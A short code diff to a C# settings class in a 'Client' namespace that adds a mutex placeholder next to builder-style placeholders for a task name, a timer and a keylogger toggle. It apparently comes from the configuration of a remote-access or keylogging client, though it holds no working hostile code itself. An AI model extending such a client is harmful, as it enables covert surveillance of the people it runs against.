@@ -14,5 +14,6 @@ namespace Client
         public static string taskName = "%C%";
         public static string time = "%1%";
         public static string offKeylog = "False";
+        public static string mutex = "%MUTEX%";
     }
 }
